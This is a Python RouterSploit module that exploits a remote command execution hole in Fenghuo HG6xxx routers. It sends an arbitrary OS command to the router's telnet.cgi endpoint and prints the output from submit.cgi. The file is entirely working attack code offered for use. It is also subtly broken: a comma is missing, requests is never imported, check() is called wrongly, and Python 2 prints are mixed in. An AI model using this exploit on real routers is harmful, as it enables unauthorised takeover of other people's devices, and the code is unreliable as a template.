from routersploit import (
    exploits,
    print_status,
    print_error,
    print_success,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit fenghuo RCE
    """
    __info__ = {
        'name': 'Fenghuo RCE',
        'description': 'Module RCE'
        'authors': [
            'mosin',  # vulnerability discovery
            'Mosin Email<hucmoxing@163.com>',  # routersploit module
        ],
        'references': [
            '',
        ],
        'devices': [
            'Fenghuo HG6xxx',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    cmd = exploits.Option('', 'OS command')  # default port

    def run(self):
        if check(self):
            url = "{}:{}/cgi-bin/telnet.cgi".format(self.target, self.port)
            url1 = "{}:{}/index_main_CM".format(self.target,self.port)
            headers = {'Referer': url1,
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'X-Requested-With': 'XMLHttpRequest',
                   'Accept': 'application/json, text/javascript, */*',
                   'Accept-Language': 'zh-CN',
                   'Accept-Encoding': 'gzip, deflate',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                   'Pragma': 'no-cache',
                   'Host': self.target
                   }
            cmds = self.cmd.replace(" ","+")
            post_data = {
                "InputCmd":cmds
                }
            url2 = "{}:{}/cgi-bin/submit.cgi".format(self.target, self.port)
            headers2 = {'Referer': url2,
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'X-Requested-With': 'XMLHttpRequest',
                   'Accept': 'application/json, text/javascript, */*',
                   'Accept-Language': 'zh-CN',
                   'Accept-Encoding': 'gzip, deflate',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                   'Pragma': 'no-cache',
                   'Host': self.target
                   }
            req1 = requests.post(url, data=post_data, headers=headers, timeout=10, verify=False)
            req2 = requests.get(url2,headers=headers2,timeout=10)
            if "success" in req1.text:
                print "[+] RCE Run Access."
                print req2.text
            else:
                print "[-] RCE Run Fail."
        else:
            print_status("[-] RCE Run Fail.")


    @mute
    def check(self):
        url = "{}:{}/cgi-bin/telnet.cgi".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200:
            return True  # target is vulnerable

        return False  # target not vulnerable
